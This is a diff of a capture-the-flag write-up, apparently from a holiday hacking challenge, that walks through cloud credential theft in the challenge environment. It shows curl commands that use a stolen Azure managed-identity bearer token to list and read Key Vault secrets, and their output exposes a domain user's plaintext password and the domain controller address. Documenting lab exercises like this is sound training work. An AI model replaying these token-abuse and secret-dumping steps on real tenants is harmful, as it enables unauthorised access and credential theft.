@@ -78,13 +78,53 @@ alabaster@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2
 ```
 
 Digging deeper with this new token in the vault releals:
+```
+joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIyMDE1NjUsIm5iZiI6MTcwMjIwMTU2NSwiZXhwIjoxNzAyMjg4MjY1LCJhaW8iOiJFMlZnWUpqeWZzTGNtVzkzblMxVkVMeGdNL2xOSEFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiNGp1aEExVDlXRWFpRmVsaUU5UUJBUSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.IrOp9yPivtkf_YUB8zgVtIPOryZgE5lYAU7mBQee9vL0Bz0DAyCbhRque50OdOwnu3-lSbarlf16ziUpHP-dIaEJcPSNEWv4m0wyOr_b0M8Y7sF8YKkDjzDWtiez1wDDV94lWqQfRtHYEgp7ZHi0B4Mi75nKR3l-F6EjHtzdod0cbQ_sRbgGfZn9LYDE44oIg48FB_WwldCVG_wr2aFos29czDSl5i447PpvVr8jDyXoI_ZKOxbDuL4FGdlXi6FSXADBRC1q5b_NhFFsWZ0u--2Q9_CUJexEiElRYjQQtvudrV3IwI-dyaiaOSCpGckN_CzxeV0Ia8QjlRLtkf-pmw' https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4| jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   244  100   244    0     0    514      0 --:--:-- --:--:-- --:--:--   514
+{
+  "value": [
+    {
+      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
+      "attributes": {
+        "enabled": true,
+        "created": 1699564823,
+        "updated": 1699564823,
+        "recoveryLevel": "Recoverable+Purgeable",
+        "recoverableDays": 90
+      },
+      "tags": {}
+    }
+  ],
+  "nextLink": null
+}
 
+
+joergen@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIyMDE1NjUsIm5iZiI6MTcwMjIwMTU2NSwiZXhwIjoxNzAyMjg4MjY1LCJhaW8iOiJFMlZnWUpqeWZzTGNtVzkzblMxVkVMeGdNL2xOSEFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiNGp1aEExVDlXRWFpRmVsaUU5UUJBUSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.IrOp9yPivtkf_YUB8zgVtIPOryZgE5lYAU7mBQee9vL0Bz0DAyCbhRque50OdOwnu3-lSbarlf16ziUpHP-dIaEJcPSNEWv4m0wyOr_b0M8Y7sF8YKkDjzDWtiez1wDDV94lWqQfRtHYEgp7ZHi0B4Mi75nKR3l-F6EjHtzdod0cbQ_sRbgGfZn9LYDE44oIg48FB_WwldCVG_wr2aFos29czDSl5i447PpvVr8jDyXoI_ZKOxbDuL4FGdlXi6FSXADBRC1q5b_NhFFsWZ0u--2Q9_CUJexEiElRYjQQtvudrV3IwI-dyaiaOSCpGckN_CzxeV0Ia8QjlRLtkf-pmw' https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4| jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   639  100   639    0     0   1025      0 --:--:-- --:--:-- --:--:--  1025
+{
+  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
+  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
+  "attributes": {
+    "enabled": true,
+    "created": 1699564823,
+    "updated": 1699564823,
+    "recoveryLevel": "Recoverable+Purgeable",
+    "recoverableDays": 90
+  },
+  "tags": {}
+}
+```
+So we have now the IP of the domain controller **10.0.0.53**, a valid user name **elfy** and the password for this user **J4`ufC49/J4766**
 
 
 
 
 **Achievement: Ipsum**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTYzNzQ5MTIyNSwxMDg3ODUzMTQ3LC0yMD
-EwMTkyNjNdfQ==
+eyJoaXN0b3J5IjpbLTEzMjk5MDY5OTksMTA4Nzg1MzE0NywtMj
+AxMDE5MjYzXX0=
 -->
